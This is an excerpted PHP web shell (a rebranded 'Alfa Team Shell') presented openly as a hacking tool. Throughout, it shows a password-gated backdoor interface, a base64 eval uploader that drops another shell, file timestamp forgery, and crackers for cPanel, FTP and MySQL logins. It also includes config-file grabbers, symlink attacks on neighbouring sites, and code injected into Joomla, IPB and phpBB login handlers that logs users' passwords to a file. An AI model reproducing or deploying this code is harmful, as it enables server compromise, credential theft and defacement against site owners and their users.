<?php
/*
	Author: 	SaikongLim/MaoShan-Team
	Telegram: 	https://telegram.me/saikonglim
	YouTube: 	https://youtube.com/saikonglim
	Gmail:		solevisible@gmail.com
	Date:		Rabu, September 26, 2026
*/
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'saikonglim',   
    'password' => '648c9387f5d9e486d8040924f28f6ce9',
    'safe_mode' => '1',
    'login_page' => '500',
    'show_icons' => '1',
...
define("__EREN_VERSION__", "4.1");
define("__EREN_UPDATE__", "2");
define("__EREN_CODE_NAME__", "Tesla");
define("__ERENUSE_FOLDER__", "ERENUSE");
define("__EREN_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
define("__EREN_SECRET_KEY__", __EREN_POST_ENCRYPTION__?_ErenSecretKey():'');
$GLOBALS['__EREN_COLOR__'] = array(
		"shell_border" => array(
			"key_color" => "#0E304A",
...
$config = array('ErenUser' => $GLOBALS['DB_NAME']['user'],'JinWoo' => $GLOBALS['DB_NAME']['pass'],'ErenProtectShell' => $GLOBALS['DB_NAME']['safemode'],'ErenLoginPage' => $GLOBALS['DB_NAME']['login_page']);
//@session_start();
@session_write_close();
...
<center><img style="border-radius:100px;" width="500" height="250" alt="Alfa Team 2012" draggable="false" src="https://bublebeeeee.github.io/piw/maoshan-team.png" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ Alfa Team Shell-v'.__EREN_VERSION__.'-'.__EREN_CODE_NAME__.' ~</b></font></th></tr>
...
}elseif($config['ErenLoginPage']=='500'){
    ...
    <div class="access-panel">
      <div class="cyber-badge">
        <div class="cyber-badge-inner">
          <img src="https://gabimaru.live/rs/sg.jpg" alt="better call saikonglim" draggable="false">
        </div>
      </div>
...
}elseif($config['ErenLoginPage']=='403'){
if(@$_COOKIE["JinWoo"] != @md5($config['JinWoo'])){
if(@md5($_POST["password"])==$config['JinWoo']){
__Eren_set_cookie("ErenUser", $config['ErenUser']);
__Eren_set_cookie("JinWoo", @md5($config['JinWoo']));
...
}elseif($config['ErenLoginPage']=='404'){
if(@$_COOKIE["JinWoo"] != @md5($config['JinWoo'])){
if(@md5($_POST["password"])==$config['JinWoo']){
__Eren_set_cookie("ErenUser", $config['ErenUser']);
__Eren_set_cookie("JinWoo", @md5($config['JinWoo']));
...
function decrypt_post($str){
	if(__EREN_POST_ENCRYPTION__){
		$pwd = __EREN_SECRET_KEY__;
...
function Eren_getColor($target){
	if(isset($GLOBALS["DB_NAME"]["color"][$target])&&$GLOBALS["DB_NAME"]["color"][$target]!=""){
		...
		$target = $GLOBALS["__EREN_COLOR__"][$target];
		if(is_array($target)){
...
function ErenCssLoadColors(){
	$css = "";
	foreach($GLOBALS['__EREN_COLOR__'] as $key => $value){
		if(!is_array($value)){
...
function _Eren_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if($is_curl||$is_socket){
		...
		$cgi_url = __ERENUSE_FOLDER__."/Erencgiapi/".$lang.$cgi_ext;
...
define("EREN_TEMPDIR", (function_exists("sys_get_temp_dir") ? (@is_writable(str_replace('\\','/',sys_get_temp_dir()))?sys_get_temp_dir():(@is_writable('.')?'.':false)) : false));
function Erenhead(){
$GLOBALS['__EREN_SHELL_CODE'] = '';
$Eren_uploader = '$x = base64_decode("'.$GLOBALS['__EREN_SHELL_CODE'].'");$solevisible = fopen("solevisible.php","w");fwrite($solevisible,$x);';
define("EREN_UPLOADER", "eval(base64_decode('".__ZW5jb2Rlcg($Eren_uploader)."'))");
if(!isset($_POST['async'])){
function Eren_GetDisable_Function(){
$disfun = @ini_get('disable_functions');
...
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?solevisible"><span style="color:#42ff59;">'.__EREN_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__EREN_VERSION__.'</span></small></a></div>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="Alfa Team 2012" draggable="false" src="https://bublebeeeee.github.io/piw/maoshan-team.png" /></td>
</tr>
<tr>
...
echo '<tr>
<td height="16" colspan="2"><span class="header_vars">Disable Functions: </span><b>'.Eren_GetDisable_Function().'</b></td>
</tr>
<tr>
<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="Eren_solevisible"><center><a href="https://t.me/solevisible" target="_blank"><span><font class="solevisible-text" color="#0F0">Sole Sad & Invisible</font></span></a></center></div></td>
</tr>
<tr>
...
if($key=='')$key='Eren';
if($method=='my'){$shell=__ZW5jb2Rlcg($shell);}else{$shell=$GLOBALS['__EREN_SHELL_CODE'];}
...
if($data==''){$get = new ErenCURL();$get->ssl = true;$data = $get->Send($target);}
...
$rmfilename = basename(rawurldecode($url));
$saveas = $path . $rmfilename;
$timestamp = @filemtime($saveas);
$oneYearAgo = $timestamp - (365 * 24 * 60 * 60);
@touch($saveas, $oneYearAgo);
echo('<font color="green">( '.$rmfilename.' ) Success...!</font>');
}else{
echo('<font color="red">( '.$rmfilename.' ) Error...!</font>');
}
echo('</center>');
}
echo("</div>");
...
foreach($penc_array as $key=>$val)$postEnc_html .= '<option value="'.$key.'" '.(!empty($_POST['Eren7'])&&$_POST['Eren7']==$key?"selected":(__EREN_POST_ENCRYPTION__&&empty($_POST['Eren7'])?'selected':'')).'>'.$val.'</option>';
...
if($_POST['Eren7']=='export'){
	...
	$glob_colors = $GLOBALS["__EREN_COLOR__"];
	$array = array();
...
<font color='#00A220'>Contact : saikonglim@gmail.com</font><br>
<font color='#00A220'>Telegram Channel: @saikonglim</font><br>
<font color='#FFFFFF'>Skype : lim.saikong</font><br>
<font color='#FFFFFF'>Skype : lim.sad</font><br>
<font color='#FF0000'>Persian Gulf For Ever</font><br>
<font color='#FF0000'>MaoShan Programmers</font><br>
...
function Eren_DirectAdmin_Cracker($info){
if(!$info['mysql'])
...
function Eren_FTP_Cracker($info){
...
function Eren_Call_Function_Cracker($method,$info){
switch($method){case 'cp':return Eren_CP_Cracker($info);break;case 'direct': case 'phpmyadmin':return Eren_DirectAdmin_Cracker($info);break;case 'ftp':return Eren_FTP_Cracker($info);break;case 'mysql':return Eren_Mysql_Cracker($info);break;case 'mysql':return Eren_FTPC($info);break;}
}
...
Eren_Call_Function_Cracker($loginpanel,$array);
}
}
...
$ErenSole = new ErenCURL(true);
$saveurl = $ErenSole->Send($path."/pwreset.php");
$getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i",$saveurl,$token);
$ErenSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=solevisible@fbi.gov");
...
$ErenCurl->Send($realurl.$realpath."/calendar.php");
$res = true;
}
if($res){
...
$ErenCurl->Send($realurl.$realpath.$faq_file);
$p1 = "UPDATE ".$_POST['Eren6']."template SET template ='".mysqli_real_escape_string($conn,$savetoass)."' WHERE title ='".$faq_name."'";
$ka1= @mysqli_query($conn,$p1) or die(mysqli_error($conn));
$res = true;
}
...
function Erencheckupdate(){
	...
	if(function_exists("curl_version")){
		$update = new ErenCURL();
		$json = $update->Send("http://solevisible.com/update.json?ver=".__EREN_VERSION__);
		$json = @json_decode($json,true);
		$data = array();
		if($json){
			if(!isset($_COOKIE['Eren_checkupdate']) && !empty($json["type"])){
				if($json["type"] == "update"){
					if(__EREN_VERSION__ != $json['version'] || __EREN_UPDATE__ != $json['version_number']){
			...
			if(isset($json["code_name"]) && !empty($json["code_name"])){
				...
				$data["version_number"] = __EREN_VERSION__;
			}
...
function ErenWriteTocgiapi($name, $source){
	...
	if(in_array($name, $not_api)){
		...
		@chdir($GLOBALS['home_cwd'] . "/" . __ERENUSE_FOLDER__);
	}
...
echo EreniFrameCreator('Eren_shtml/Eren_ssi.shtml');
echo '</div>';
Erenfooter();
}
function Erencloudflare(){
Erenhead();
ErenNum(8,9,10,7,6,5,4,3);
...
$uid_n = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($_POST['Eren1'])):'';
$gid_n = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($_POST['Eren1'])):'';
if(!$uid_n&&!$gid_n){
...
if($type!='file'){
return ($file=='..'?$s.'back.png':'http://jinwoo.live/icons/folder.png');
}else{
$ext = explode('.',$file);
$ext = end($ext);
$ext = strtolower($ext);
...
Eren_Create_A_Tag('pwchanger',$vals);
echo '</h3></center>';
...
function ErenCreateParentFolder(){
	$parent = $GLOBALS['home_cwd'] . "/" . __ERENUSE_FOLDER__;
	if(!@is_dir($parent)){
...
if(isset($_POST['Eren2'])&&($_POST['Eren2']=='symperl'||$_POST["Eren2"]=="sympy")){
	...
	if(strlen($resource) == 0){
		echo EreniFrameCreator('cgiEren/'.$cginame);
	}else{
		echo $resource;
	}
}
...
echo __pre();
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__ERENUSE_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
}
...
echo $table_header;
$count=1;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__ERENUSE_FOLDER__.'/Erensymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
...
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__ERENUSE_FOLDER__.'/Erensymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
if($sole){
...
@chmod($name,0755);
echo '<iframe src="'.__ERENUSE_FOLDER__.'/cgiEren/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
Erenfooter();
...
$code = '<?php jimport(\'joomla.user.authentication\');$Eren_auth = & JAuthentication::getInstance();$Eren_data = array(\'username\'=>$_POST[\'username\'],\'password\'=>$_POST[\'passwd\']);$Eren_options = array();$Eren_response = $Eren_auth->authenticate($Eren_data, $Eren_options);if($Eren_response->status == 1){$Eren_file="{saveto_path}";$fp=@fopen($Eren_file,"a+");@fwrite($fp, $Eren_response->username.":".$_POST[\'passwd\']." ( ".$Eren_response->email." )\n");@fclose($fp);$f = @file($Eren_file);$new = array_unique($f);$fp = @fopen($Eren_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}?>';
$code=str_replace('{saveto_path}',$saveto,$code);
...
$code = '$Eren_q = $this->DB->buildAndFetch(array(\'select\' => \'email\', \'from\' => \'members\', \'where\' => \'name="\'.$username.\'" OR email="\'.$email.\'"\'));$Eren_file = "{saveto_path}";$fp = @fopen($Eren_file, "a+");@fwrite($fp, $_POST[\'ips_username\'].\' : \'.$_POST[\'ips_password\'].\' ( \'.$Eren_q[\'email\'].\' )\'."\n");@fclose($fp);$f = @file($Eren_file);$new = array_unique($f);$fp = @fopen($Eren_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);';
...
$code = '$Eren_u = request_var(\'username\', \'\');$Eren_p = request_var(\'password\', \'\');if($Eren_u != \'\' AND $Eren_p != \'\'){$Eren_response = $auth->login($Eren_u,$Eren_p);if($Eren_response[\'status\'] == LOGIN_SUCCESS){$Eren_file ="{saveto_path}";$fp = @fopen($Eren_file, "a+");@fwrite($fp, $Eren_u." : ".$Eren_p. " ( ".$Eren_response[\'user_row\'][\'user_email\']." )\n");@fclose($fp);$f = @file($Eren_file);$new = array_unique($f);$fp = @fopen($Eren_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}';
$find = 'case \'login\':';
$code=str_replace('{saveto_path}',$saveto,$code);
$login=$path."/ucp.php";
$evil_login = "\t".$find."\n\t".$code;
...
function Eren_StrSearcher($dir,$string,$ext,$e,$arr=array()){
if(@is_dir($dir)){
$files=@scandir($dir);
...
Eren_StrSearcher($path,$string,$ext,$e,$results);
$results[] = $path;
}}}}
...
function Erenconfig_grabber(){
	...
	if($_POST['Eren5']=='>>'){
		echo __pre();
		Eren_ConfigGrabber($dir, $ext);
	}
	echo '</div>';
	Erenfooter();
}
function Eren_ConfigGrabber($dir, $ext) {
...
Eren_Searcher($dir,trim($ext),$method);
}
}
if($_POST['Eren1']=='str'){
...
echo __pre();
Eren_StrSearcher($dir,$string,$ext,$_POST['Eren6']);
}
}
echo '</div>';
Erenfooter();
...
if(@is_dir($newfile)){
Eren_ReadDir($newfile,$method,$defpage);
}else{
if(!@is_writable($newfile))continue;
if(!@is_readable($newfile))continue;
Eren_Rewriter($newfile,$file,$defpage,$method);
}
}
closedir($dh);
...
function Eren_ReadDir($dir,$method='',$defpage=''){
...
if($file == '..' || $file == '.')continue;
$newfile=$dir.'/'.$file;
if(@is_readable($newfile)&&@is_dir($newfile))Eren_ReadDir($newfile,$method,$defpage);
if(@is_file($newfile)){
if(!@is_readable($newfile))continue;
Eren_Rewriter($newfile,$file,$defpage,$method);
}
...
function Eren_Rewriter($dir,$file,$defpage,$m='index'){
...
function Eren_Create_A_Tag($action,$vals){
$nulls = array();
...
function Eren_Searcher($dir, $ext, $method) {
if(@is_readable($dir)){
if($method == 'all')$ext = '*';
if($method == 'dirs')$ext = '*';
$globFiles = @glob("$dir/*.$ext");
...
function EreniFrameCreator($f,$width='100%',$height='600px'){
return('<iframe src="'.__ERENUSE_FOLDER__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
}
class ErenCURL {
public $headers;
public $user_agent;
...
$this->path = EREN_TEMPDIR.'/Eren_cookies.txt';
